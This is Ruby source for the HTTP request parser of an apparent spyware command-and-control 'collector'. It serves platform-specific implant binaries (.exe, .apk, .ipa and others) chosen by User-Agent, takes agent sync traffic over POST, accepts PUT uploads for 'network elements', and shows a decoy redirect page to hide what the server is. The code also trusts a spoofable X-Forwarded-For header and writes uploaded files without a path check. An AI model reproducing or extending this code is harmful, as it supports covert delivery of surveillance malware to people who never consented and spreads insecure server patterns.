#
#  HTTP requests parsing module
#

# relatives
require_relative 'network_controller.rb'
require_relative 'protocol.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/mime'


module RCS
module Collector

module Parser
  include RCS::Tracer

  # parse a request from a client
  def http_parse(http_headers, req_method, req_uri, req_cookie, req_content)

    # default values
    resp_content = nil
    resp_content_type = nil
    resp_cookie = nil

    case req_method
      when 'GET'
        # serve the requested file
        resp_content, resp_content_type = http_get_file http_headers, req_uri

      when 'POST'
        # get the peer ip address if it was forwarded by a proxy
        @peer = http_get_forwarded_peer(http_headers) || @peer
        # the REST protocol for synchronization
        resp_content, resp_content_type, resp_cookie = Protocol.parse @peer, req_uri, req_cookie, req_content

      when 'PUT'
        # only the DB is authorized to send PUT commands
        if @peer.eql? Config.instance.global['DB_ADDRESS'] then

          #TODO: time request from server
          
          if req_uri.start_with?('/RCS-NC_') then
            # this is a request for a network element
            resp_content, resp_content_type = NetworkController.push req_uri.delete('/RCS-NC_'), req_content
          else
            # this is a request to save a file in the public dir
            resp_content, resp_content_type = http_put_file req_uri, req_content
          end
        else
          trace :warn, "HACK ALERT: #{@peer} is trying to send PUT [#{req_uri}] commands!!!"
        end

    end

    # fallback for all the cases.
    # if the content is empty (which means an error at any level)
    # return the decoy page
    resp_content, resp_content_type = http_decoy_page if resp_content.nil?

    return resp_content, resp_content_type, resp_cookie
  end

  # display a fake page in case someone is trying to connect to the collector
  # with a browser or something else
  def http_decoy_page
    # default decoy page
    page = "<html> <head>" +
           "<meta http-equiv=\"refresh\" content=\"0;url=http://www.google.com\">" +
           "</head> </html>"

    # custom decoy page
    file_path = Dir.pwd + "/config/decoy.html"
    page = File.read(file_path) if File.exist?(file_path)

    trace :info, "[#{@peer}] Decoy page displayed"

    return page, 'text/html'
  end

  # returns the content of a file in the public directory
  def http_get_file(headers, uri)

    content = nil
    type = nil

    # no automatic index
    return content, type if uri.eql? '/'

    # retrieve the Operating System of the requester
    os, ext = http_get_os(headers)

    # search the file in the public directory
    file_path = Dir.pwd + PUBLIC_DIR + uri

    trace :info, "[#{@peer}][#{os}] serving #{file_path}"

    # get the real (escaped) path of the file to prevent
    # the injection of some ../../ paths in the uri
    begin
      real = File.realdirpath file_path
    rescue
      real = ''
    end

    # if the real path starts with our public directory
    # it means that we are inside the directory and the uri
    # has not escaped from it
    if real.start_with? Dir.pwd + PUBLIC_DIR then
      # load the content of the file
      begin
        content = File.open(file_path, 'rb') {|f| f.read} if File.exist?(file_path) and File.file?(file_path)
        # if the file was not found, search for the platform specific one
        # by appending the extension
        if content.nil? then
          file_path += ext
          trace :info, "[#{@peer}][#{os}] trying #{file_path}"
          content = File.open(file_path, 'rb') {|f| f.read} if File.exist?(file_path) and File.file?(file_path)
        end
        type = MimeType.get(file_path)
      rescue
      end
    end

    if not content.nil?
      trace :info, "[#{@peer}] " + File.size(file_path).to_s + " bytes served [#{type}]"
    else
      trace :info, "[#{@peer}] file not found"
    end

    return content, type
  end

  # returns the operating system of the requester
  def http_get_os(headers)
    # extract the user-agent
    headers.keep_if { |val| val['User-Agent:']}
    user_agent = headers.first

    trace :debug, "[#{@peer}] #{user_agent}"
    
    # return the correct type and extension
    return 'macos', '.app' if user_agent['MacOS;'] or user_agent['Macintosh;']
    return 'iphone', '.ipa' if user_agent['iPhone;'] or user_agent['iPad;'] or user_agent['iPod;']
    return 'windows', '.exe' if user_agent['Windows;']
    return 'winmo', '.cab' if user_agent['Windows CE;']
    return 'blackberry', '.jad' if user_agent['BlackBerry;']
    return 'linux', '.bin' if user_agent['Linux;'] or user_agent['X11;']
    return 'symbian', '.sisx' if user_agent['Symbian;']
    return 'android', '.apk' if user_agent['Android;']
    
    return 'unknown', ''
  end

  # save a file in the /public directory
  def http_put_file(uri, content)
    begin
      # split the path in all the subdir and the filename
      dirs = uri.split('/').keep_if {|x| x.length > 0}
      file = dirs.pop
      if dirs.length == 0 then
        File.open(Dir.pwd + PUBLIC_DIR + '/' + file, 'wb') { |f| f.write content }
      else
        # create all the subdirs
        path = Dir.pwd + PUBLIC_DIR
        dirs.each do |d|
          path += '/' + d
          Dir.mkdir(path)
        end
        # and then the file
        File.open(path + '/' + file, 'wb') { |f| f.write content }
      end
    rescue Exception => e
      return e.message, "text/html"
    end

    return 'OK', 'text/html'
  end

  # return the content of the X-Forwarded-For header
  def http_get_forwarded_peer(headers)
    # extract the XFF
    headers.keep_if { |val| val['X-Forwarded-For:']}
    xff = headers.first
    # no header
    return nil if xff.nil?
    # remove the x-forwarded-for: part
    xff.slice!(0..16)
    # split the peers list
    peers = xff.split(',')
    trace :info, "[#{@peer}] has forwarded the connection for [#{peers.first}]"
    # we just want the first peer that is the original one
    return peers.first
  end

end #Parser

end #Collector::
end #RCS::